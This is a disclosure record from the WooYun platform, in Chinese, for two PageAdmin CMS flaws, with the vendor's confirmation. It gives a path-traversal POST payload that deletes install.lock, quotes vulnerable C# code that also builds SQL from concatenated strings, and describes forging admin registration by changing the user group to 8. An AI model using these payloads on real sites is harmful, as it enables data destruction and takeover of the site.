{"id": 1146, "wybug_id": "wooyun-2014-066504", "wybug_title": "PageAdmin任意文件删除+注册管理员", "wybug_corp": "pageadmin.net", "wybug_author": "what_news", "wybug_date": "2014-06-28 11:12", "wybug_open_date": "2014-09-26 11:14", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向公众公开  简要描述： 最新版任意文件删除 详细说明：  漏洞一 任意文件删除 可导致系统重装 不过需要管理员权限看下这个文件\ne/aspx/delete_file.aspx\n\n<% @ Page language=\"c#\"%><% @ Import NameSpace=\"System.Data\"%><% @ Import NameSpace=\"System.Data.OleDb\"%><% @ Import NameSpace=\"System.IO\"%><% @ Import NameSpace=\"PageAdmin\"%><script Language=\"C#\" Runat=\"server\">override protected void OnInit(EventArgs e){  Check_Post();  string Table=Request.Form[\"table\"];  string Field=Request.Form[\"field\"];  string Id=Request.Form[\"id\"];  string D_File=Request.Form[\"path\"];  string UserName=\"\";  int IsMaster=0;  int CanDel=1;  if(IsStr(Table) && IsStr(Field) && IsNum(Id))    {     Conn theconn=new Conn();     OleDbConnection conn=new OleDbConnection(theconn.Constr());     conn.Open();     if(Request.Cookies[\"Master\"]!=null)      {        Master_Valicate Master=new Master_Valicate();        Master.Master_Check();        IsMaster=1;      }     else      {        Member_Valicate Member=new Member_Valicate();        Member.Member_Check();        UserName=Member._UserName;      }     string sql;     OleDbCommand comm;     OleDbDataReader dr;     sql=\"select id from pa_field where thetable='\"+Table+\"' and [field]='\"+Field+\"'\";     comm=new OleDbCommand(sql,conn);     dr=comm.ExecuteReader();     if(!dr.Read()       {        CanDel=0;       }      dr.Close();     if(CanDel==1) //数据库要有刚才那个记录 candel的值才不会被修改为0      {        if(IsMaster==1) //需要管理员权限        {         Del_File(D_File); //跟进        }       if(Id!=\"0\")       {        if(IsMaster==0)        {         sql=\"update \"+Table+\" set \"+Field+\"='' where username='\"+UserName+\"'' and id=\"+Id;        }       else        {         sql=\"update \"+Table+\" set \"+Field+\"='' where id=\"+Id;        }        comm=new OleDbCommand(sql,conn);        comm.ExecuteNonQuery();        if(IsMaster==0)        {         sql=\"update pa_file set detail_id=0 where username='\"+UserName+\"'' and thetable='\"+Table+\"' and [field]='\"+Field+\"' and detail_id=\"+Id;        }       else        {         sql=\"update pa_file set detail_id=0 where thetable='\"+Table+\"' and [field]='\"+Field+\"' and detail_id=\"+Id;        }        comm=new OleDbCommand(sql,conn);        comm.ExecuteNonQuery();       }      }     conn.Close();    }}private void Del_File(string FilePath) {   if(FilePath!=\"\" && FilePath.IndexOf(\":\")<0 && FilePath.IndexOf(\"/e/upload/\")==0) //没过滤..可跳出目录 要以/e/upload/ 开头    {     if(FilePath.IndexOf(\"/zdy/\")<0)       {         FilePath=Server.MapPath(FilePath);         if(File.Exists(FilePath))          {            File.Delete(FilePath);          }      }   } }\n漏洞证明可结合大牛的漏洞进行组合攻击PageAdmin可绕过验证伪造任意用户身份登录（前台、后台）\nhttp://wooyun.org/bugs/wooyun-2010-061861\n现在进行测试就不用上面的步骤了，默认admin/admin 登陆后台，然后访问\nhttp://192.168.1.104/e/aspx/delete_file.aspx\npost 提交\ntable=pa_member&Field=pa_address&id=0&path=/e/upload/../install/install.lock\n本来是这样的 install.lock没删除\n\n按上面操作之后\n\n系统就可以重新安装了或者可删除任意文件了 漏洞二 系统后台是默认 不允许注册管理员的\n\n我们看下前台注册吧访问\nhttp://192.168.1.104/e/member/index.aspx?s=1&type=reg\n我们提交注册信息抓下包看看\n\n多了一个用户组 1代表普通会员 8代表管理员 把他修改成提交\n\n\n\n\n\n然后看下后台\n\n后台虽然设置了 禁止注册管理员账号 但是我们还是注册了管理员账号如果开启了这样的模式\n\n很多人认为 如果禁止了管理员注册了 那么第二个选项 是否审核注册用户觉得很多余了 干脆不审核注册管理员账号 或者可以设置邮箱验证（下拉有三个选项 不要选无需验证就好） 哈哈 那就危险了   漏洞证明：  漏洞证明如上   修复方案：  对参数进行处理    版权声明：转载请注明来源 what_news@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-28 11:26 厂商回复： 非常感谢，我司将尽快发布更新文件。 最新状态： 2014-10-17：新版本已经修复此漏洞，感谢白帽子  ", "replys": "漏洞评价：\n评论\n     2014-09-26 11:36 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  学习下，，，，一个$是多少money?    \n     2015-08-10 18:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  添加了管理员之后需要审核才可以登录？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}